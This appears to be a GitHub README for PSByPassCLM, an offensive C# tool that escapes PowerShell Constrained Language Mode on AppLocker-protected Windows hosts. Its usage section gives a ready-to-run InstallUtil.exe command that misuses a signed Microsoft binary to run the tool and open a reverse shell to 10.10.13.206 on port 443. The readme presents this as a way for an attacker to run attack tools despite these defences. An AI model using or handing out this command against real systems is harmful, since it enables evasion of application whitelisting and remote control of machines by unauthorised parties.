# PSByPassCLM
Bypass for PowerShell Constrained Language Mode

## Description and references 
This technique might come in handy wherever or whenever you're stuck in a low privilege PS console  
and PowerShell Version 2 engine is not available to perform a [PowerShell Downgrade Attacks](http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/).

What described above may happen in [modern] Windows OSes (like Windows 10, Windows Server 2016..),  
that nowdays are shipped out with AppLocker and PowerShell Version 5 (v5).

With AppLocker in Allow mode and PowerShell running in Constrained Mode, it is not possible for an attacker  
to change the PowerShell language mode to full in order to run attack tools.  
Imho, not beeing able to use core language functionalities (eg, load script in memory and so on..) it's a such a pain.

"PowerShell v5 detects when AppLocker Allow mode is in effect and sets the PowerShell language to Constrained Mode,  
severely limiting the attack surface on the system.  
With AppLocker in Allow mode and PowerShell running in Constrained Mode, it is not possible for an attacker  
to change the PowerShell language mode to full in order to run attack tools." [[Source]](https://adsecurity.org/?p=2604)
 
## Build the binary
The project is written in C#. All the source (few lines of codes though) is committed: .csproj, .sln ...
You should be able to easily compile and build the binary with the default configuration Debug/X64.

## Usage
Well, nothing new here as we're going to use the old and well-known trick of "InstallUtil.exe" to bypass execution of exe.
Once you've compiled the binary, issue the below command on the target host.

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```


## Author
This code is developed by Chris D. [@padovah4ck](https://twitter.com/padovah4ck) // [LinkedIn](https://www.linkedin.com/in/chrisdanieli/) //   
Use it at your own risk. No responsability on my side
